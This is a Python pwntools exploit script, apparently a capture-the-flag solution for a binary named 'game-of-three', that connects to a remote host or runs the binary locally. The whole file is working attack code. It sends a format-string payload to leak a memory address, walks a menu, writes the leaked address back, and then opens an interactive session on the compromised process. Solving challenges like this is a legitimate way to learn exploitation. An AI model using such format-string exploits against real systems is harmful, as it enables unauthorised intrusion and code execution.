#!/usr/bin/env python3

from pwn import *

exe = ELF("./game-of-three")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("144.24.133.118", 6003)

    return r


def main():
    # gdb.attach(r, '''
    #            heap-analysis-helper
    #            c
    #            ''')

    r = conn()
    pl = "%10$p"
    r.sendlineafter(b"name:",pl.encode())
    r.recvuntil(b"ree,")
    leek = int(r.recvline(),16)
    print(hex(leek))
    r.sendlineafter(b"put:",b"+")
    r.sendlineafter(b"put:",b"d")
    r.sendlineafter(b"put:",b"e")
    r.recvline()
    pl = p64(leek)
    r.sendline(pl)
    r.sendlineafter(b"put:",b"r")

    r.interactive()


if __name__ == "__main__":
    main()
